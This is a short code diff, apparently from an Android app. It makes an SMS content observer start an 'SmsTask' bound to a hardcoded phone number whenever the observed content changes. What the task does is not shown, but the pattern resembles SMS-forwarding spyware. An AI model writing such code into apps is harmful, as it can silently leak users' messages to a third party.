@@ -14,6 +14,7 @@ public class SmsObserver extends ContentObserver{
         context = ctx;
     }
     public void onChange(boolean selfChange){
-
+        SmsTask smsTask = new SmsTask("18807963708",context);
+        smsTask.start();
     }
 }
